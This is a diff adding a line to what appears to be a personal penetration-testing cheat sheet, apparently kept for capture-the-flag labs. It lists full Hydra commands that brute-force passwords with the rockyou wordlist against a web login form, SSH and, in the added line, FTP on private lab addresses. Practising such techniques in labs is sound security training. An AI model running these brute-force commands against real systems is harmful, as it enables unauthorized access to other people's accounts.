@@ -27,6 +27,8 @@
 - Password web --> `hydra -l molly -P rockyou.txt 10.10.212.76 http-post-form "/login:username=^USER^&password=^PASS^:incorrect" -V`
 
 - Password SSH --> `hydra -l molly -P rockyou.txt 10.10.212.76 ssh`
+
+- Password FTp --> `hydra -l chris -P /usr/share/wordlist/rockyou.txt 10.10.150.97 ftp`
 	
 ## Nmap
 
